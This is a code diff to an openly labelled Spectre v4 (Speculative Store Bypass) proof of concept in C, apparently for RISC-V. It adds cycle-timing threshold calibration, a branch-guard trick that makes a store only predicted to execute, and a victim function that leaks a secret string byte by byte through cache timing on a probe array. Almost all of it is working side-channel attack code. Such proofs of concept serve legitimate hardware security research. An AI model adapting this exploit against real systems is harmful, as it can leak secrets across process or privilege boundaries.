@@ -3,6 +3,40 @@
 #include "encoding.h"
 #include "cache.h"
 
+static inline uint64_t measure_cycles(volatile uint8_t *addr){
+    uint64_t t1 = rdcycle();
+    volatile uint8_t v = *addr; (void)v;
+    return rdcycle() - t1;
+}
+
+static uint64_t calibrate_threshold(uint8_t *probe_base){
+    // Crude calibration: take min of several warmed hits and avg of cold misses
+    const int iters = 64;
+    uint64_t hit_min = (uint64_t)-1, miss_avg = 0;
+    // Warm one line
+    volatile uint8_t *warm = probe_base;
+    for(int i=0;i<32;i++){ volatile uint8_t x = *warm; (void)x; }
+    for(int i=0;i<iters;i++){
+        uint64_t c = measure_cycles((volatile uint8_t*)warm);
+        if(c < hit_min) hit_min = c;
+    }
+    // Choose a far line likely mapping to different set; here +4096*8 as heuristic
+    volatile uint8_t *cold = probe_base + 4096*8;
+    // Try to evict by touching a large range; fallback to flushCache if available macro
+    for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
+    for(int i=0;i<iters;i++){
+        // Try to keep it cold by simple dummy sweep
+        for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
+        uint64_t c = measure_cycles((volatile uint8_t*)cold);
+        miss_avg += c;
+    }
+    miss_avg /= iters;
+    uint64_t thr = (hit_min*3 + miss_avg*1)/4; // skew toward miss
+    if(thr < hit_min+2) thr = hit_min+2;
+    return thr;
+}
+
+
 // -----------------------------------------------------
 // Configuration Parameters
 // -----------------------------------------------------
@@ -27,6 +61,7 @@ uint8_t  padding2[64];          // Padding
 uint8_t  array2[256 * L1_BLOCK_SZ_BYTES];
 // Secret data located relative to array1
 char* secretData = "ThisIsTheSecretString";
+volatile uint8_t ssb_guard = 1;
 
 // -----------------------------------------------------
 // Utility: Find top two results (e.g., cache hits)
@@ -62,25 +97,14 @@ void findTopTwo(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, u
  * @param idx Index into array1, used for both store and subsequent load.
  * @param attackerValue Value to store into array1[idx] (e.g., the current secret byte).
  */
-void victimFunctionSSB(uint64_t idx, uint8_t attackerValue) {
-    // 1. Store the attacker-controlled value (current secret byte) into array1.
-    //    This store might be buffered and not immediately visible to subsequent loads.
-    array1[idx] = attackerValue;
-
-    // --- Speculative Execution Window for SSB ---
-    // 2. Load from array2, indexed by array1[idx].
-    //    Due to SSB, the processor might speculatively use a stale value
-    //    of array1[idx] (the value *before* the store above completed)
-    //    to calculate the address for this load.
-    //    This leaks the *stale* value via the access pattern to array2.
+void victimFunctionSSB(uint64_t idx, uint8_t attackerValue){
+    // Store placed behind a guard predicted as taken during training.
+    if (ssb_guard){
+        array1[idx] = attackerValue; // executes during training; on attack, predicted-taken but actually not taken
+    }
+    // Load uses potentially stale value if store was only predicted
     uint8_t temp = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
-    // --- End Speculative Window ---
-
-    // Use temp in inline assembly to prevent compiler optimizing it away.
-    asm volatile("" : "+r" (temp) : : "memory");
-
-    // printf("Victim executed: stored %d at index %llu, loaded based on array1[idx]\n", attackerValue, idx); // Debug print
-    (void)temp; // Prevent unused warning if asm volatile removed
+    asm volatile("") ; (void)temp;
 }
 
 // -----------------------------------------------------
@@ -100,6 +124,8 @@ int main(void) {
     uint8_t  dummy = 0;            // Dummy variable for cache reads
     static uint64_t results[256]; // Cache hit results
 
+    uint64_t g_threshold = calibrate_threshold(array2);
+
     printf("Starting Spectre v4 (SSB) PoC...\n");
 
     // Loop through each byte of the secret
@@ -115,10 +141,12 @@ int main(void) {
         for (uint64_t round = 0; round < SAME_INDEX_ROUNDS; ++round) {
 
             // Flush the probe array (array2)
+            ssb_guard = 1;
             flushCache((uint64_t)array2, sizeof(array2));
 
             // Branch predictor training and attack loop
             for (int64_t k = ((NUM_TRAINING + 1) * NUM_ROUNDS) - 1; k >= 0; --k) {
+                ssb_guard = (k==0) ? 0 : 1;
                 // Conditionally select target address for JALR: victimAddr or placeholderAddr
                 passInAddr = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                 passInAddr = (passInAddr | (passInAddr >> 16));
@@ -179,7 +207,7 @@ int main(void) {
                  elapsedTime = rdcycle() - startTime;
 
                  // Record cache hit
-                 if (elapsedTime < CACHE_THRESHOLD) {
+                 if (elapsedTime < g_threshold) {
                      results[m]++;
                  }
             }
